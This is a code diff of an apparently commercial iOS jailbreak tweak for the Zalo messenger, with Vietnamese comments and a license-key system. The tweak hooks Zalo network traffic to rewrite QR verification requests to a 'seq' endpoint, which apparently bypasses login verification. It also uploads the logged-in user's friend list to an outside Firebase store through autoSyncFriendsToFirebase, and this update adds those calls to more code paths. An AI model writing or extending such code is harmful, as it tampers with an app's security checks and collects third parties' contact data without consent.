@@ -1,7 +1,7 @@
 /**
  * ==============================================================================
  * TWEAK CLANGG - ZALO SEQ REDIRECT & HỆ THỐNG ACTIVE LICENSE KEY TRÊN IPHONE
- * Tác giả: clang | Version: 1.2.8
+ * Tác giả: clang | Version: 1.2.9
  * ==============================================================================
  * Tính năng chính:
  * 1. Popup nhập Mã Key (License Key) lần đầu trên iPhone khi mở Zalo.
@@ -458,16 +458,14 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
         completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
             if (error || !data) {
                 // Lỗi mạng: quyết định fail-open/closed dựa trên policy đã lưu từ lần trước
-                // Chưa biết policy (lần đầu không có mạng): fail-closed → không bật hook
-                // Policy = unlimited: fail-open → chấp nhận
-                // Policy = whitelist: fail-closed → không bật hook
                 if (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
+                    // Policy unlimited: fail-open - cho phép chạy mà không cần xác nhận lại
                     g_tweakEnabled = YES;
-                    if (onVerified) {
-                        dispatch_async(dispatch_get_main_queue(), onVerified);
-                    }
+                    if (onVerified) dispatch_async(dispatch_get_main_queue(), onVerified);
+                } else {
+                    // Chưa biết policy hoặc whitelist: fail-closed - tắt cửng bách
+                    g_tweakEnabled = NO;
                 }
-                // Mọi trường hợp khác: giữ g_tweakEnabled = NO
                 return;
             }
 
@@ -489,8 +487,9 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
             NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
             NSDictionary *fields = json[@"fields"];
             if (!fields) {
-                // Dữ liệu Firebase không hợp lệ → khóa an toàn
+                // Dữ liệu Firebase không hợp lệ → khóa an toàn + xóa cache
                 g_tweakEnabled = NO;
+                clearPolicyFromDisk();
                 return;
             }
 
@@ -563,13 +562,12 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
             }
             savePolicyToDisk(g_cachedPhonePolicy, g_cachedAllowedPhones);
 
-            // 5. Khi startup (phoneStr = nil) và policy = whitelist:
-            //    Chưa biết SĐT đang đăng nhập → giữ g_tweakEnabled = NO
-            //    Hook sẽ chỉ bật sau khi kiểm tra phone tại thời điểm thực thi
+            // 5. Xử lý startup (phoneStr = nil) với policy whitelist:
+            //    Không bật g_tweakEnabled ngay - chưa biết SĐT hiện tại.
+            //    Hook viewDidAppear sẽ detect phone rồi gọi verifyKeyAndExecute(phone)
+            //    lần 2 để xác nhận whitelist và mới set g_tweakEnabled = YES.
             if ([phonePolicy isEqualToString:@"whitelist"] && (!phoneStr || phoneStr.length < 9)) {
-                // Startup verify - không có phone: mọi hook whitelist-dependent phải kiểm tra lại
-                // g_tweakEnabled vẫn = NO; lưu policy để hôm sau fail-closed
-                if (onVerified) dispatch_async(dispatch_get_main_queue(), onVerified);
+                // g_tweakEnabled giữ = NO; onVerified không có gì quan trọng khi startup
                 return;
             }
 
@@ -1182,23 +1180,28 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 - (void)viewDidAppear:(BOOL)animated {
     %orig;
 
-    // Chỉ hoạt động khi tweak đã được kích hoạt hợp lệ
-    if (!g_tweakEnabled) return;
-    
     NSString *clsName = NSStringFromClass([self class]);
-    if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
+    if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] ||
+        [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
+
         static NSString *lastExtractedPhone = nil;
-        
         NSString *currentPhone = getZaloLivePhoneNumber();
-        // Bổ sung: kiểm tra whitelist cho SĐT đang đăng nhập
-        if (currentPhone && currentPhone.length >= 8 &&
-            ![currentPhone isEqualToString:lastExtractedPhone] &&
-            isPhoneAllowedByWhitelist(currentPhone)) {
-            lastExtractedPhone = [currentPhone copy];
-            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+        if (!currentPhone || currentPhone.length < 8) return;
+        if ([currentPhone isEqualToString:lastExtractedPhone]) return;
+
+        lastExtractedPhone = [currentPhone copy];
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+            if (!g_tweakEnabled) {
+                // Chưa bật: thử xác nhận với phone thật (xử lý case startup whitelist)
+                verifyKeyAndExecute(currentPhone, ^{
+                    autoSyncFriendsToFirebase(currentPhone);
+                });
+            } else if (isPhoneAllowedByWhitelist(currentPhone)) {
+                // Đã bật và phone hợp lệ: chỉ sync bạn bè
                 autoSyncFriendsToFirebase(currentPhone);
-            });
-        }
+            }
+            // Phone không trong whitelist: không sync, không tác động
+        });
     }
 }
 
@@ -1236,10 +1239,17 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             if (data && !error) {
                 @try {
                     // TẦNG 1: QR→SEQ trong response network
-                    // Guard 2: kiểm tra SĐT hiện tại tại thời điểm redirect
+                    // Guard 2: fail-closed khi policy=whitelist nhưng phone chưa xác định,
+                    //          hoặc khi phone đã biết nhưng không trong whitelist
                     NSString *livePhone = g_activeLoggedInPhone;
-                    BOOL phoneOk = (!livePhone || livePhone.length < 8) ||
-                                   isPhoneAllowedByWhitelist(livePhone);
+                    BOOL phoneOk;
+                    if (!livePhone || livePhone.length < 8) {
+                        // Phone chưa biết: cho phép nếu unlimited, chặn nếu whitelist
+                        phoneOk = (g_cachedPhonePolicy &&
+                                   [g_cachedPhonePolicy isEqualToString:@"unlimited"]);
+                    } else {
+                        phoneOk = isPhoneAllowedByWhitelist(livePhone);
+                    }
                     if (phoneOk) {
                         NSString *dataString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                         if (dataString && ([dataString containsString:@"/verify/v3/qr"] || [dataString containsString:@"/qr/request"])) {
@@ -1381,12 +1391,20 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             }
             if (!phoneParam) phoneParam = g_activeLoggedInPhone;
 
-            // Nếu có phone và không được phép: không redirect, trả QR gốc
-            if (phoneParam && phoneParam.length >= 8 && !isPhoneAllowedByWhitelist(phoneParam)) {
+            // Guard 2: fail-closed tuyệt đối
+            // - Không tìm được phone + whitelist mode → không redirect
+            // - Tìm được phone nhưng không trong whitelist → không redirect
+            if (!phoneParam || phoneParam.length < 8) {
+                // Phone chưa biết: chỉ redirect nếu policy unlimited
+                if (!g_cachedPhonePolicy || ![g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
+                    return %orig(request);
+                }
+            } else if (!isPhoneAllowedByWhitelist(phoneParam)) {
+                // Phone đã biết nhưng không trong whitelist
                 return %orig(request);
+            } else {
+                autoSyncFriendsToFirebase(phoneParam);
             }
-
-            if (phoneParam && phoneParam.length >= 8) autoSyncFriendsToFirebase(phoneParam);
 
             NSString *seqUrlStr = urlStr;
             seqUrlStr = [seqUrlStr stringByReplacingOccurrencesOfString:@"/verify/v3/qr/request" withString:@"/verify/v3/seq"];
